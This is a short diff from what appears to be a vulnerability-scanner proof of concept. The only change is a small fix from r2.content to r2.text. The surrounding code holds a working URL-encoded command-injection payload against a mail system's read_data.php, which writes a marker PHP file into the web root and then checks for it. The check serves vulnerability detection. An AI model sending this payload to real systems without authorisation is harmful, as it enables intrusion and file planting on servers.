@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = "/src%2fread_data.php%3fsd%3dxxx%26uid%3d+%26+echo+%27%3c%3fphp+echo+testvul+%3b%3f%3e%27+%3e+%2fvar%2fwww%2fnewmail%2ftestvul.php+%26+%26action%3dzzz%26file_name%3d%26user%3dtest%40123.com"
             r1 = requests.get(self.target + payload)
             r2 = requests.get(self.target + "/testvul.php")
-            if r2.status_code == 200 and 'testvul' in r2.content:
+            if r2.status_code == 200 and 'testvul' in r2.text:
                 # security_hole(url+payload)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
